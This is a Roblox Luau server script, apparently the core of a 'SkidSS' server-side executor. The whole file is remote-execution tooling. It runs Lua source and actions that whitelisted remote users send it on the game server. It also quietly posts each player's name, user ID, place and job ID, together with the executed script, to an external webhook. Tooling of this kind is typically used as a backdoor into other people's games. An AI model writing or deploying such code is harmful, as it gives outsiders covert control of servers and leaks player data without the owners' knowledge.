local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

if ReplicatedStorage:FindFirstChild("SkidSS_Net") then
	return
end

local Shared = ReplicatedStorage:WaitForChild("SkidSS")
local Net = require(Shared.Net)

local Whitelist = require(script.Whitelist)
local Executor = require(script.Executor)

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local cachedPlaceName
local function placeName()
	if not cachedPlaceName then
		local ok, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
		cachedPlaceName = (ok and info and info.Name) or ("Place " .. game.PlaceId)
	end
	return cachedPlaceName
end

local webhookLast = 0
local function postWebhook(player, payload)
	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
	local now = os.clock()
	if now - webhookLast < 2 then return end
	webhookLast = now
	task.spawn(function()
		local script = (payload.mode == "lua" and string.sub(tostring(payload.source or ""), 1, 1500))
			or (payload.mode == "action" and ("action: " .. tostring(payload.name)))
			or (payload.mode == "blocks" and "(blocks)")
			or tostring(payload.mode)
		local body = {
			player = player.Name,
			userId = player.UserId,
			place = placeName(),
			placeId = game.PlaceId,
			jobId = game.JobId,
			players = #Players:GetPlayers(),
			mode = tostring(payload.mode),
			script = script,
		}
		pcall(function() HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(body)) end)
	end)
end

local CustomRuntime = {
	onPlayerAdded = function(_player) end,
	onPlayerRemoving = function(_player) end,
	onRequestReceived = function(_player, _payload) return true end,
	customActions = {},
}

local folder = Net.build()
local requestAccess = folder:FindFirstChild(Net.RequestAccess)
local execute = folder:FindFirstChild(Net.Execute)
local output = folder:FindFirstChild(Net.Output)

requestAccess.OnServerInvoke = function(player)
	return Whitelist.isAllowed(player)
end

task.spawn(function()
	while true do
		Whitelist.refresh()
		task.wait(20)
	end
end)

local lastRun = {}

local function injectClient(_player) end

execute.OnServerEvent:Connect(function(player, payload)
	if not Whitelist.isAllowed(player) or type(payload) ~= "table" then
		return
	end

	local now = os.clock()
	if lastRun[player] and now - lastRun[player] < 0.25 then
		return
	end
	lastRun[player] = now

	local allowed = true
	local hookOk, hookRet = pcall(CustomRuntime.onRequestReceived, player, payload)
	if hookOk then allowed = hookRet ~= false end
	if not allowed then
		output:FireClient(player, "\u{2717} rejected by custom runtime")
		return
	end

	local function emit(text)
		output:FireClient(player, tostring(text))
	end

	postWebhook(player, payload)

	task.spawn(function()
		local ok, message = Executor.run(player, payload, emit, CustomRuntime)
		emit((ok and "\u{2713} " or "\u{2717} ") .. tostring(message))
	end)
end)

local function onJoin(player)
	Whitelist.refreshIfStale()
	if Whitelist.isAllowed(player) then
		injectClient(player)
	end
	pcall(CustomRuntime.onPlayerAdded, player)
end

Players.PlayerAdded:Connect(function(player)
	task.spawn(onJoin, player)
end)

for _, player in Players:GetPlayers() do
	task.spawn(onJoin, player)
end

Players.PlayerRemoving:Connect(function(player)
	lastRun[player] = nil
	pcall(CustomRuntime.onPlayerRemoving, player)
end)
